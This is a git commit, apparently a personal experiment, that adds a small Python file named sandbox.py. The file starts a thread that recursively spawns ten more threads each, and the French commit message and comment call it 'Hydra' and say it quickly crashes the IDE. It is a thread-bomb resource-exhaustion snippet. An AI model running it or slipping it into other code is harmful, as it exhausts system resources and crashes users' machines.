f5c2b444c04fe5396ef9ac7c49be7f76abbfea89
Ambition42 <gabriel.doyen.12@gmail.com>
2025-01-15 17:23:57 +0100

    Algorithme Hydra : lorsqu'une tête meurt, 10 repoussent

---
+++ sandbox.py
@@ -0,0 +1,19 @@
+import threading
+
+
+def create_thread():
+    global threads_list
+    for x in range(10):
+        new_thread = threading.Thread(target=create_thread)
+        threads_list.append(new_thread)
+        print(f"Number of threads : {len(threads_list)}")
+        new_thread.start()
+
+
+adam = threading.Thread(target=create_thread)
+threads_list = [adam]
+
+adam.start()
+
+# Hydra
+# Fait rapidement planter l'IDE
